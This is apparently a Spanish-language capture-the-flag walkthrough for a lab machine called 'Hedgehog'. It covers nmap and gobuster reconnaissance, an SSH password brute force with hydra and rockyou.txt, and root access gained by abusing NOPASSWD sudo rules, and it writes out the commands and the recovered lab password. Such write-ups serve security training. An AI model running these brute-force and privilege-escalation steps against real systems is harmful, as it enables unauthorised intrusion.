# Hedgehog
## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.6p1 Ubuntu`
*   `80/tcp open http Apache httpd 2.4.58 ((Ubuntu))
## 2. Enumeración Web y Búsqueda de Credenciales

Al acceder a la dirección IP del objetivo en un navegador web, la página muestra una pista importante.

### 2.1. Pista en la Página Web

La página web en `http://<IP_DEL_OBJETIVO>` muestra la palabra "tails". Esto sugiere que "tails" podría ser un nombre de usuario en el sistema, probablemente para el servicio SSH.

### 2.2. Enumeración de Directorios

Realizamos una enumeración de directorios con `gobuster` para buscar más pistas en el servidor web, pero no encontramos nada relevante para el acceso inicial.

```bash
gobuster dir -u http://<IP_DEL_OBJETIVO> -w /path/to/wordlist/directory-list-lowercase-2.3-medium.txt
```

La fuerza bruta es la siguiente opción lógica para obtener la contraseña del usuario `tails`.

## 3. Acceso Inicial (Fuerza Bruta SSH)

Utilizamos `hydra` para intentar adivinar la contraseña del usuario `tails` en el servicio SSH, usando un diccionario de contraseñas común como `rockyou.txt`.

```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado Clave:**

*   La contraseña obtenida es `3117548331`.

### 3.1. Conexión SSH

Con las credenciales obtenidas (`tails:3117548331`), nos conectamos al servidor SSH.

```bash
ssh tails@<IP_DEL_OBJETIVO>
# Contraseña: 3117548331
```

## 4. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `tails`, el objetivo es escalar privilegios a `root`.

### 4.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario `tails` con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `User tails may run the following commands on ...: (sonic) NOPASSWD: ALL`

Esto significa que el usuario `tails` puede ejecutar cualquier comando como el usuario `sonic` sin necesidad de contraseña.

### 4.2. Escalada de Privilegios Horizontal

Podemos obtener un shell como `sonic`.

```bash
sudo -u sonic /bin/bash
# Ahora estamos como el usuario sonic

sudo -l
```

```bash
User sonic may run the following commands on fd41cefc8882:
    (ALL) NOPASSWD: ALL

sudo su
```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
